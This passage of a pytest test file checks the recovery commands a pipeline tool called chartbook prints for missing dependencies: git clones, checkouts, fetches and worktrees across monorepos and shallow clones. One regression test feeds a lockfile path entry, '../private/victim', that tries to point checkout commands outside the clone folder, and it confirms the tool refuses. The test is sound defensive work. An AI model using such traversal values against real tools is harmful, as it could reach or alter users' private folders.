        wanted = _git(mid, "rev-parse", "HEAD")
        _pipeline(work, "report", {"acme/mid": {"commit": wanted[:10]}})
        _away(work, "mid")
        result = _run(work, monkeypatch, "run")  # against their store, which has mid at its first commit only
        assert _numbered(result) == [f"1. acme/mid at {wanted[:7]}    https://example.org/acme/mid"]
        # Twelve digits of the commit the entry's ten resolved to (found by the third pass: an entry's seven stayed seven)
        assert _has(_said(result), f"git -C {_q(work / 'mid')} checkout {wanted[:12]}", f"chartbook run --snapshot --project-dir {_q(work / 'mid')}")

    def test_of_a_pipeline_in_a_folder_of_its_repository(self, work, theirs, mine, monkeypatch):
        commit = _ready(_pipeline(work, "mid", within="pipelines/mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[4:8] == [
            f"1. acme/mid at {commit[:7]}    https://example.org/acme/mid",
            f"     git clone https://example.org/acme/mid {_q(work / 'mid')}",
            f"     git -C {_q(work / 'mid')} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid' / 'pipelines' / 'mid')}",
        ]

    def test_of_two_pipelines_in_one_repository(self, work, theirs, mine, monkeypatch):
        """Fetched once, cloned once, and each built in its own folder of the one clone."""
        top = _several(work, "mono", {"a": None, "b": None})
        commit = [_ready(top / name, theirs) for name in ("a", "b")][0]
        _ready(_pipeline(work, "report", {"acme/a": {}, "acme/b": {}}), theirs)
        _away(work, "mono")
        mine()
        result = _run(work, monkeypatch, "run")
        said = _said(result)
        assert [line for line in said if line.startswith("Fetching ")] == [
            "Fetching https://example.org/acme/mono, to see what acme/a reads in turn."
        ]
        assert said[4:11] == [
            f"1. acme/a at {commit[:7]}    https://example.org/acme/mono",
            f"     git clone https://example.org/acme/mono {_q(work / 'mono')}",
            f"     git -C {_q(work / 'mono')} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mono' / 'a')}",
            f"2. acme/b at {commit[:7]}    https://example.org/acme/mono",
            f"     git -C {_q(work / 'mono')} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mono' / 'b')}",  # cloned by the line before
        ]
        assert "Ran build in 1 pipeline(s)." in _follow(work, result, monkeypatch).stdout

    def test_of_a_pipeline_that_reads_a_folder_of_its_own_repository(self, work, theirs, mine, monkeypatch):
        """Found by review: beta reads `../alpha`, in the repository beta was read from, and alpha's repository was "not recorded"."""
        top = _several(work, "mono", {"alpha": None, "beta": {"acme/alpha": {"path": "../alpha"}}})
        first = _ready(top / "alpha", theirs)
        second = _ready(top / "beta", theirs)
        _ready(_pipeline(work, "report", {"acme/beta": {}}), theirs)
        _away(work, "mono")
        mine()
        result = _run(work, monkeypatch, "run")
        assert _said(result)[4:11] == [
            f"1. acme/alpha at {first[:7]}    https://example.org/acme/mono",
            f"     git clone https://example.org/acme/mono {_q(work / 'mono')}",
            f"     git -C {_q(work / 'mono')} checkout {first[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mono' / 'alpha')}",
            f"2. acme/beta at {second[:7]}    https://example.org/acme/mono; reads 1 above",
            f"     git -C {_q(work / 'mono')} checkout {second[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mono' / 'beta')}",
        ]
        assert "Ran build in 1 pipeline(s)." in _follow(work, result, monkeypatch).stdout

    def test_of_a_pipeline_whose_id_is_its_place_in_its_repository(self, work, theirs, mine, monkeypatch):
        """Found by review: at the top of its repository with no `[project] id`, and another manifest below it, it was "not found"."""
        mid = _pipeline(work, "mid", identified=False)
        (mid / "extra").mkdir()
        _write(mid / "extra", _table("extra"))
        _git(mid, "add", "-A")
        _git(mid, "commit", "--quiet", "-m", "Another below it")
        commit = _ready(mid, theirs)
        assert snapshot.pipeline_in(mid) == "acme/mid"  # from its remote
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert _has(said, f"git -C {_q(work / 'mid')} checkout {commit[:12]}", f"chartbook run --snapshot --project-dir {_q(work / 'mid')}")
        assert not any("not known" in line for line in said)

    def test_of_a_pipeline_among_several_in_its_repository(self, work, theirs, mine, monkeypatch):
        """Its own manifest is the one that gives its ID, and its lockfile the one beside that."""
        _ready(_pipeline(work, "rates"), theirs)
        mid = _pipeline(work, "mid", {"acme/rates": {}}, within="pipelines/mid")
        top = work / "mid"
        (top / "chartbook.toml").write_text('[project]\nid = "acme/all"\n', encoding="utf-8", newline="\n")
        (top / "pipelines" / "a").mkdir()
        (top / "pipelines" / "a" / "chartbook.toml").write_text('[project]\nid = "acme/a"\n', encoding="utf-8", newline="\n")
        _git(top, "add", "-A")
        _git(top, "commit", "--quiet", "-m", "Others beside it")
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "rates", "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert f"2. acme/mid at {commit[:7]}    https://example.org/acme/mid; reads 1 above" in said
        assert _has(
            said, f"git -C {_q(work / 'mid')} checkout {commit[:12]}",
            f"chartbook run --snapshot --project-dir {_q(work / 'mid' / 'pipelines' / 'mid')}",
        )
        # Of very many manifests, so many are read. One past them is not called absent (found by the third pass: it
        # was said to hold no such pipeline): its line says how far the search went, and where it may be
        monkeypatch.setattr(missing, "MOST_MANIFESTS", 1)
        said = _said(_run(work, monkeypatch, "run"))
        assert f"1. acme/mid at {commit[:7]}    https://example.org/acme/mid" in said
        assert _has(said, f"git -C {_q(work / 'mid')} checkout {commit[:12]}", f"chartbook run --snapshot --project-dir {_q(work / 'mid')}")
        assert (
            f"     What it reads in turn is not known: its chartbook.toml was not found among the first 1 of the 3 in its "
            f"repository at {commit[:7]}; if it is not at the top of its repository, give its folder there to `--project-dir`. Its own "
            "`chartbook run` says."
        ) in said

    def test_a_clone_that_has_the_commit_is_not_fetched_where_its_manifest_was_not_found(self, work, theirs, mine, monkeypatch):
        """A fetch is for a clone that lacks the commit, and not for one whose manifests were not all read."""
        mid = _pipeline(work, "mid", within="pipelines/mid")
        top = work / "mid"
        (top / "chartbook.toml").write_text('[project]\nid = "acme/all"\n', encoding="utf-8", newline="\n")
        _git(top, "add", "-A")
        _git(top, "commit", "--quiet", "-m", "Another at its top")
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        mine()
        monkeypatch.setattr(missing, "MOST_MANIFESTS", 1)
        said = _said(_run(work, monkeypatch, "run"))
        assert said[3:6] == [
            f"1. acme/mid at {commit[:7]}    {_up('mid')} (a clone of https://example.org/acme/mid)",
            f"     git -C {_q(top)} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(top)}",
        ]
        assert "was not found among the first 1 of the 2 in its repository" in said[6]

    def test_of_a_pipeline_with_no_build_script(self, work, theirs, mine, monkeypatch):
        """It commits what it declares: nothing to run, and a snapshot to make."""
        commit = _ready(_pipeline(work, "mid", builds=False), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert _has(said, f"git -C {_q(work / 'mid')} checkout {commit[:12]}", f"chartbook snapshot --project-dir {_q(work / 'mid')}")

    def test_stops_where_it_is_too_deep_and_says_so(self, work, theirs, mine, monkeypatch):
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        monkeypatch.setattr(missing, "DEEPEST", 1)
        said = _said(_run(work, monkeypatch, "run"))
        assert any(line.startswith("     What it reads in turn is not known: the list stops here: it is more than 1 pipelines deep") for line in said)


class TestWhateverCommitACloneWasLeftOn:
    """Found by the second pass of the review: a line was written as if the lines above it had not been done."""

    def test_a_folder_that_is_not_there_until_the_checkout(self, work, theirs, mine, monkeypatch):
        """alpha was snapshotted before beta was added to their repository: `cd beta && git checkout` failed at the `cd`, every time.

        (As the list was then. Its checkout is still made from the repository's top, on a line of its own.)
        """
        top = _several(work, "multi", {"alpha": None})
        first = _ready(top / "alpha", theirs)
        second = _ready(_added(top, "beta", {"acme/alpha": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/beta": {}}), theirs)
        _away(work, "multi")
        mine()
        result = _run(work, monkeypatch, "run")
        clone = work / "multi"
        assert _said(result)[4:11] == [
            f"1. acme/alpha at {first[:7]}    https://example.org/acme/multi",
            f"     git clone https://example.org/acme/multi {_q(clone)}",
            f"     git -C {_q(clone)} checkout {first[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(clone / 'alpha')}",
            f"2. acme/beta at {second[:7]}    https://example.org/acme/multi; reads 1 above",
            f"     git -C {_q(clone)} checkout {second[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(clone / 'beta')}",
        ]
        assert "Ran build in 1 pipeline(s)." in _follow(work, result, monkeypatch).stdout

    def test_one_that_was_never_pinned_is_built_where_it_was_read(self, work, theirs, mine, monkeypatch):
        """After a line that leaves its clone on an old commit, a line with no pin had no checkout at all, and built whatever was there."""
        top = _several(work, "multi", {"alpha": None})
        first = _ready(top / "alpha", theirs)
        _added(top, "gamma")
        now = _git(top, "rev-parse", "HEAD")
        report = _pipeline(work, "report", {"acme/alpha": {}})
        _ready(report, theirs)
        _write(report, _table("report", {"acme/alpha": {}, "acme/gamma": {"repository": "https://example.org/acme/multi"}}))
        _git(report, "commit", "--quiet", "-am", "Reads gamma too")
        _away(work, "multi")
        mine()
        result = _run(work, monkeypatch, "run")
        clone = work / "multi"
        assert [line for line in _said(result) if line.startswith(("1.", "2.", "     git", "     chartbook run --snapshot"))] == [
            f"1. acme/alpha at {first[:7]}    https://example.org/acme/multi",
            f"     git clone https://example.org/acme/multi {_q(clone)}",
            f"     git -C {_q(clone)} checkout {first[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(clone / 'alpha')}",
            "2. acme/gamma    https://example.org/acme/multi",
            f"     git -C {_q(clone)} checkout {now[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(clone / 'gamma')}",
        ]
        done = _follow(work, result, monkeypatch)
        assert "Ran build in 1 pipeline(s)." in done.stdout

    def test_a_folder_that_is_built_is_not_called_so_once_a_line_above_moves_it(self, work, theirs, mine, monkeypatch):
        top = _several(work, "multi", {"old": None})
        first = _ready(top / "old", theirs)
        new = _added(top, "new")
        report = _pipeline(work, "report", {"acme/old": {"path": "../multi/old"}})
        _ready(report, theirs)
        _write(report, _table("report", {"acme/old": {"path": "../multi/old"}, "acme/new": {"path": "../multi/new"}}))
        _git(report, "commit", "--quiet", "-am", "Reads new too")
        (new / "out.csv").write_text("a,b\nnew,1\n", encoding="utf-8", newline="\n")  # built, and never snapshotted
        _built_by_a_run(new)
        now = _git(top, "rev-parse", "HEAD")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert [line for line in said if "acme/new" in line or "acme/old" in line or line.startswith(("     git -C", "     chartbook snapshot", "     chartbook run --snapshot"))] == [
            # By its key, `new` comes first: built where it stands, before anything moves
            f"1. acme/new    {os.path.join('..', 'multi', 'new')} (a folder on this machine, built already)",
            f"     chartbook snapshot --project-dir {_q(top / 'new')}",
            f"2. acme/old at {first[:7]}    {os.path.join('..', 'multi', 'old')} (a folder on this machine)",
            f"     git -C {_q(top)} checkout {first[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(top / 'old')}",
        ]
        assert now
        # And the other way round, as `said` is given them: after the line that moves the repository
        listing = missing.find(report, FolderStore(work / "mine"))
        listing.wanted.reverse()
        again = missing.said(listing, here=report)
        assert f"2. acme/new    {os.path.join('..', 'multi', 'new')} (a folder on this machine)" in again
        assert _has(again, f"git -C {_q(top)} checkout {now[:12]}", f"chartbook run --snapshot --project-dir {_q(top / 'new')}")


class TestACloneOnThisMachine:
    """A clone of a repository that sits beside the pipeline's own is read where it is, and nothing is fetched."""

    def test_it_is_read_and_nothing_is_fetched_or_cloned(self, work, theirs, mine, monkeypatch):
        commits = _chain(work, theirs)
        mine()
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        result = _run(work, monkeypatch, "run")
        assert _said(result)[3:7] == [
            f"1. acme/rates at {commits['rates'][:7]}    {_up('rates')} (a clone of https://example.org/acme/rates)",
            f"     chartbook run --snapshot --project-dir {_q(work / 'rates')}",  # and it is on that commit
            f"2. acme/mid at {commits['mid'][:7]}    {_up('mid')} (a clone of https://example.org/acme/mid); reads 1 above",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
        ]
        _git(work / "rates", "commit", "--quiet", "--allow-empty", "-m", "On")
        moved = _run(work, monkeypatch, "run")
        assert _said(moved)[4:6] == [
            f"     git -C {_q(work / 'rates')} checkout {commits['rates'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'rates')}",
        ]
        assert "Ran build in 1 pipeline(s)." in _follow(work, moved, monkeypatch).stdout

    def test_a_pipeline_in_a_folder_of_it_is_found_there(self, work, theirs, mine, monkeypatch):
        """Found by review: with the clone beside, the list still fetched, and said to clone into the folder that was there."""
        commit = _ready(_pipeline(work, "mid", within="pipelines/mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        mine()
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        assert _said(_run(work, monkeypatch, "run"))[3:5] == [
            f"1. acme/mid at {commit[:7]}    {os.path.join('..', 'mid', 'pipelines', 'mid')} (a clone of https://example.org/acme/mid)",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid' / 'pipelines' / 'mid')}",
        ]

    def test_one_that_lacks_the_commit_is_fetched_there(self, work, theirs, mine, monkeypatch):
        mid = _pipeline(work, "mid")
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "On")
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        # A clone of it from before that commit was made
        rename_when_let(mid, work / "newer")
        _git(work, "clone", "--quiet", "--single-branch", str(work / "newer"), "mid")
        _git(mid, "remote", "set-url", "origin", "https://example.org/acme/mid.git")
        _git(mid, "update-ref", "-d", "refs/remotes/origin/main")
        _git(mid, "reset", "--quiet", "--hard", "HEAD~1")
        _git(mid, "reflog", "expire", "--expire=now", "--all")
        _git(mid, "gc", "--quiet", "--prune=now")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[3:8] == [
            f"1. acme/mid at {commit[:7]}    {_up('mid')} (a clone of https://example.org/acme/mid)",
            f"     git -C {_q(work / 'mid')} fetch",
            f"     git -C {_q(work / 'mid')} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
            f"     What it reads in turn is not known: its clone, {work / 'mid'}, does not have the commit {commit[:7]}; "
            f"if it is not at the top of its repository, give its folder there to `--project-dir`. Its own `chartbook run` says.",
        ]

    def test_one_that_lacks_the_commit_is_built_in_the_folder_the_clone_has_it_in(self, work, theirs, mine, monkeypatch):
        """Found by the third pass: after the fetch the list said to build at the top of the clone, where no pipeline is."""
        mid = _pipeline(work, "mid", within="pipelines/mid")
        top = work / "mid"
        _git(top, "commit", "--quiet", "--allow-empty", "-m", "On")
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        # A clone of it from before that commit was made
        rename_when_let(top, work / "newer")
        _git(work, "clone", "--quiet", "--single-branch", str(work / "newer"), "mid")
        _git(top, "remote", "set-url", "origin", "https://example.org/acme/mid.git")
        _git(top, "update-ref", "-d", "refs/remotes/origin/main")
        _git(top, "reset", "--quiet", "--hard", "HEAD~1")
        _git(top, "reflog", "expire", "--expire=now", "--all")
        _git(top, "gc", "--quiet", "--prune=now")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[4:8] == [
            f"     git -C {_q(top)} fetch",
            f"     git -C {_q(top)} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(top / 'pipelines' / 'mid')}",
            f"     What it reads in turn is not known: its clone, {top}, does not have the commit {commit[:7]}; "
            "its folder is where the clone has it now. Its own `chartbook run` says.",
        ]

    def test_a_folder_in_a_shallow_repository_is_told_to_deepen_it(self, work, theirs, mine, monkeypatch):
        """Found by the third pass: a `path` entry's folder there was still told a plain `git fetch`, which does not deepen it."""
        mid = _pipeline(work, "mid")
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {"path": "../mid"}}), theirs)
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "On")
        rename_when_let(mid, work / "whole")
        _git(work, "clone", "--quiet", "--depth", "1", (work / "whole").as_uri(), "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert (
            f"     What it reads in turn is not known: {mid} does not have its chartbook.toml at {commit[:7]} "
            "(`git fetch --unshallow` there, if the commit is not in it). Its own `chartbook run` says."
        ) in said

    def test_a_shallow_one_is_deepened(self, work, theirs, mine, monkeypatch):
        """Found by the second pass: a plain `git fetch` does not deepen a shallow clone, and the list repeated."""
        mid = _pipeline(work, "mid")
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "On")
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "And on")
        rename_when_let(mid, work / "whole")
        _git(work, "clone", "--quiet", "--depth", "1", (work / "whole").as_uri(), "mid")
        _git(mid, "remote", "set-url", "origin", "https://example.org/acme/mid.git")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[4:7] == [
            f"     git -C {_q(mid)} fetch --unshallow",
            f"     git -C {_q(mid)} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(mid)}",
        ]

    def test_the_clone_the_list_said_to_make_is_found_the_next_time(self, work, theirs, mine, monkeypatch):
        """Found by the second pass: told to clone to `mid-2`, and asked again with that done, it said `mid-3`."""
        commit = _ready(_pipeline(work, "mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        (work / "mid").mkdir()  # a folder of that name that is no clone
        mine()
        assert f"     git clone https://example.org/acme/mid {_q(work / 'mid-2')}" in _said(_run(work, monkeypatch, "run"))
        _git(work, "clone", "--quiet", str(work / "elsewhere" / "mid"), "mid-2")
        _git(work / "mid-2", "remote", "set-url", "origin", "https://example.org/acme/mid.git")
        assert _said(_run(work, monkeypatch, "run"))[3:5] == [
            f"1. acme/mid at {commit[:7]}    {_up('mid-2')} (a clone of https://example.org/acme/mid)",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid-2')}",
        ]

    @pytest.mark.skipif(os.name == "nt", reason="a link to nowhere is made as an administrator there")
    def test_a_name_that_a_link_to_nowhere_has_is_not_free(self, work, theirs, mine, monkeypatch):
        _ready(_pipeline(work, "mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        (work / "mid").symlink_to(work / "nowhere")
        mine()
        assert f"     git clone https://example.org/acme/mid {_q(work / 'mid-2')}" in _said(_run(work, monkeypatch, "run"))

    def test_one_that_was_never_pinned_is_told_by_the_id_its_origin_gives(self, work, theirs, monkeypatch):
        """Found by the second pass: with no address recorded, a clone beside was no longer found at all. Its `origin` says whose it is."""
        mid = _pipeline(work, "mid")
        _pipeline(work, "report", {"acme/mid": {}})
        said = _said(_run(work, monkeypatch, "run"))
        assert said[5:7] == [
            f"1. acme/mid    {_up('mid')} (a clone of https://example.org/acme/mid)",
            f"     chartbook run --snapshot --project-dir {_q(mid)}",
        ]
        # Not a folder of that name whose origin is another's, whatever its manifest says
        _git(mid, "remote", "set-url", "origin", "https://example.org/someone/else.git")
        from chartbook import identity

        identity._git_remote_cache.clear()
        assert "1. acme/mid    its repository is not recorded, so neither is what it reads in turn" in _said(_run(work, monkeypatch, "run"))

    def test_one_with_no_commit_yet_is_pulled(self, work, theirs, monkeypatch):
        """`git init`, an `origin`, and nothing pulled: a fetch would leave its folder empty, and the build would find no pipeline there."""
        _pipeline(work, "mid")
        _pipeline(work, "report", {"acme/mid": {}})
        _away(work, "mid")
        mid = work / "mid"
        _git(work, "init", "--quiet", "-b", "main", "mid")
        _git(mid, "remote", "add", "origin", "https://example.org/acme/mid")  # as the pull below is answered here
        result = _run(work, monkeypatch, "run")
        assert _said(result)[5:8] == [
            f"1. acme/mid    {_up('mid')} (a clone of https://example.org/acme/mid)",
            f"     git -C {_q(mid)} pull origin HEAD",
            f"     chartbook run --snapshot --project-dir {_q(mid)}",
        ]
        assert _said(result)[8] == (
            f"     What it reads in turn is not known: its clone, {mid}, has no commit yet; "
            "if it is not at the top of its repository, give its folder there to `--project-dir`. Its own `chartbook run` says."
        )
        assert "Ran build in 1 pipeline(s)." in _follow(work, result, monkeypatch).stdout

    def test_a_folder_a_clones_lockfile_names_outside_where_clones_are_kept_is_no_command(self, work, theirs, mine, monkeypatch):
        """Found by the second pass: a clone's `path` entry could aim `cd FOLDER && git checkout` at any folder of the machine."""
        (work / "private").mkdir()
        target = _pipeline(work / "private", "victim")
        _ready(target, theirs)
        mid = _pipeline(work, "mid", {"acme/victim": {"path": "../private/victim"}})
        commit = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        mine()
        result = _run(work, monkeypatch, "run")
        assert not any(str(target) in line for line in _said(result) if line.startswith("     "))
        assert f"2. acme/mid at {commit[:7]}    {_up('mid')} (a clone of https://example.org/acme/mid); reads 1 above" in _said(result)
        assert _numbered(result)[0].startswith("1. acme/victim at ") and "its folder, ../private/victim, is not on this machine" in _numbered(result)[0]

    def test_a_folder_that_is_no_clone_of_it_is_not_taken_for_one(self, work, theirs, mine, monkeypatch):
        """Found by review: a folder of that name with a pipeline of that ID, in no git or of another history, was read as the clone.

        Its address is kept in the line, and it is cloned beside under a name that is free.
        """
        commit = _ready(_pipeline(work, "mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        (work / "mid").mkdir()
        _write(work / "mid", _table("mid"))  # the same ID, and no repository at all
        mine()
        assert _said(_run(work, monkeypatch, "run"))[4:8] == [
            f"1. acme/mid at {commit[:7]}    https://example.org/acme/mid",
            f"     git clone https://example.org/acme/mid {_q(work / 'mid-2')}",
            f"     git -C {_q(work / 'mid-2')} checkout {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid-2')}",
        ]
        # Nor is a repository of another address
        _repository(work / "mid", "another")
        assert _numbered(_run(work, monkeypatch, "run")) == [f"1. acme/mid at {commit[:7]}    https://example.org/acme/mid"]


class TestInThePipelinesOwnRepository:
    """A repository of several pipelines. A checkout there would move the pipeline itself: what is at another commit is built in a worktree."""

    def _made(self, work, theirs, reads: dict) -> tuple[Path, str]:
        top = _several(work, "mono", {"mid": None, "report": reads})
        commit = _ready(top / "mid", theirs)
        _ready(top / "report", theirs)  # its lockfile is a commit later: mid is pinned at the one before
        return top, commit

    @pytest.mark.parametrize("reads", [{"acme/mid": {"path": "../mid"}}, {"acme/mid": {}}], ids=["by its folder", "by its ID"])
    def test_it_is_built_in_a_worktree_and_the_pipeline_stays_where_it_is(self, work, theirs, mine, monkeypatch, reads):
        """Found by review: the list said `git checkout` in the reader's own repository, and its last command then built the pipeline as it was at that commit."""
        top, commit = self._made(work, theirs, reads)
        mine()
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        monkeypatch.chdir(top / "report")
        result = CliRunner().invoke(main, ["run"])
        tree = work / f"mono-at-{commit[:12]}"
        assert _said(result) == [
            f"acme/report cannot be built yet: 1 pipeline it reads is not in the store at {work / 'mine'}.",
            *ONE,
            f"1. acme/mid at {commit[:7]}    {_up('mid')} (a folder of this repository, at another commit)",
            f"     git -C {_q(top)} worktree add {_q(tree)} {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(tree / 'mid')}",
            "",
            "Then here again:",
            f"     chartbook run --project-dir {_q(top / 'report')}",
            SHARED.format("it"),
        ]
        head = _git(top, "rev-parse", "HEAD")
        done = _follow(work, result, monkeypatch, start=top / "report")
        assert "Ran build in 1 pipeline(s)." in done.stdout
        assert _git(top, "rev-parse", "HEAD") == head and _git(top, "symbolic-ref", "--short", "HEAD") == "main"

    def test_it_is_this_repository_whatever_its_folder_is_called(self, work, theirs, mine, monkeypatch):
        """Told by its `origin`, and not by a folder named as `git clone` would name it."""
        top, commit = self._made(work, theirs, {"acme/mid": {}})
        rename_when_let(top, work / "my-checkout")
        mine()
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        monkeypatch.chdir(work / "my-checkout" / "report")
        said = _said(CliRunner().invoke(main, ["run"]))
        assert said[3:5] == [
            f"1. acme/mid at {commit[:7]}    {_up('mid')} (a folder of this repository, at another commit)",
            f"     git -C {_q(work / 'my-checkout')} worktree add {_q(work / f'my-checkout-at-{commit[:12]}')} {commit[:12]}",
        ]

    def test_two_of_it_at_one_commit_share_a_worktree(self, work, theirs, mine, monkeypatch):
        top = _several(work, "mono", {"a": None, "b": None, "report": {"acme/a": {"path": "../a"}, "acme/b": {"path": "../b"}}})
        commit = [_ready(top / name, theirs) for name in ("a", "b")][0]
        _ready(top / "report", theirs)
        mine()
        monkeypatch.chdir(top / "report")
        result = CliRunner().invoke(main, ["run"])
        tree = work / f"mono-at-{commit[:12]}"
        assert [line for line in _said(result) if line.startswith("     ")][:3] == [
            f"     git -C {_q(top)} worktree add {_q(tree)} {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(tree / 'a')}",
            f"     chartbook run --snapshot --project-dir {_q(tree / 'b')}",
        ]
        # And one that is there already is not added again
        _git(top, "worktree", "add", "--quiet", str(tree), commit[:12])
        assert not any("worktree add" in line for line in _said(CliRunner().invoke(main, ["run"])))

    def test_a_folder_of_the_worktrees_name_that_is_not_it_is_passed_by(self, work, theirs, mine, monkeypatch):
        """Found by the third pass: a leftover folder of that name was taken for the worktree, and the `cd` into it failed every time."""
        top, commit = self._made(work, theirs, {"acme/mid": {"path": "../mid"}})
        mine()
        monkeypatch.chdir(top / "report")
        tree = work / f"mono-at-{commit[:12]}"
        tree.mkdir()  # a leftover
        second = work / f"mono-at-{commit[:12]}-2"
        result = CliRunner().invoke(main, ["run"])
        assert _said(result)[4:6] == [
            f"     git -C {_q(top)} worktree add {_q(second)} {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(second / 'mid')}",
        ]
        assert "Ran build in 1 pipeline(s)." in _follow(work, result, monkeypatch, start=top / "report").stdout

    def test_nor_is_a_worktree_of_that_name_that_somebody_moved(self, work, theirs, mine, monkeypatch):
        """It would have been built as it stands, at another commit, under the pinned one's line."""
        top, commit = self._made(work, theirs, {"acme/mid": {"path": "../mid"}})
        mine()
        monkeypatch.chdir(top / "report")
        tree = work / f"mono-at-{commit[:12]}"
        _git(top, "worktree", "add", "--quiet", "--detach", str(tree), "HEAD")  # of that name, on the reader's commit
        said = _said(CliRunner().invoke(main, ["run"]))
        assert said[4] == f"     git -C {_q(top)} worktree add {_q(work / f'mono-at-{commit[:12]}-2')} {commit[:12]}"

    def test_where_this_repository_is_the_clone_wanted_and_lacks_the_commit(self, work, theirs, mine, monkeypatch):
        """Found by the second pass: the list said `git fetch && git checkout` in the reader's own repository, and its last command built the other pipeline there."""
        rates = _pipeline(work, "rates")
        _git(work, "clone", "--quiet", str(rates), "my-report")
        report = work / "my-report"
        _git(report, "remote", "set-url", "origin", "https://example.org/acme/rates")  # which the folder of that name answers
        _git(rates, "commit", "--quiet", "--allow-empty", "-m", "On")
        commit = _ready(rates, theirs)
        _write(report, _table("report", {"acme/rates": {}}))
        _git(report, "commit", "--quiet", "-am", "A report of its own, begun as a clone of rates")
        _ready(report, theirs)
        _away(work, "rates")
        mine()
        monkeypatch.chdir(report)
        result = CliRunner().invoke(main, ["run"])
        tree = work / f"my-report-at-{commit[:12]}"
        assert _said(result)[3:8] == [
            f"1. acme/rates at {commit[:7]}    . (a clone of https://example.org/acme/rates)",
            f"     git -C {_q(report)} fetch",
            f"     git -C {_q(report)} worktree add {_q(tree)} {commit[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(tree)}",
            f"     What it reads in turn is not known: its clone, {report}, does not have the commit {commit[:7]}; "
            f"if it is not at the top of its repository, give its folder there to `--project-dir`. Its own `chartbook run` says.",
        ]
        head = _git(report, "rev-parse", "HEAD")
        done = _follow(work, result, monkeypatch, start=report)
        assert "acme/report: build" in done.stdout and "Ran build in 1 pipeline(s)." in done.stdout
        assert _git(report, "rev-parse", "HEAD") == head and _git(report, "symbolic-ref", "--short", "HEAD") == "main"

    def test_one_that_is_on_its_commit_is_built_where_it_is(self, work, theirs, mine, monkeypatch):
        top = _several(work, "mono", {"mid": None, "report": {"acme/mid": {"path": "../mid"}}})
        _pipeline(work, "elsewhere-report", {"acme/mid": {"path": "../mono/mid"}})
        commit = _ready(top / "mid", theirs)
        _write(top / "report", _table("report", {"acme/mid": {"path": "../mid"}}))
        lock.pin(top / "report", theirs)  # written, and not committed: the repository is still on mid's commit
        mine()
        monkeypatch.chdir(top / "report")
        assert _said(CliRunner().invoke(main, ["run"]))[3:5] == [
            f"1. acme/mid at {commit[:7]}    {_up('mid')} (a folder on this machine)",
            f"     chartbook run --snapshot --project-dir {_q(top / 'mid')}",
        ]


class TestWhoseTextThisIs:
    """A lockfile, a manifest and a repository's tree are anyone's."""

    def _with(self, work, theirs, change) -> Path:
        _ready(_pipeline(work, "mid"), theirs)
        report = _pipeline(work, "report", {"acme/mid": {}})
        _ready(report, theirs)
        document = json.loads((report / lock.LOCK_FILE).read_text(encoding="utf-8"))
        change(document["records"][0]["dependencies"][0])
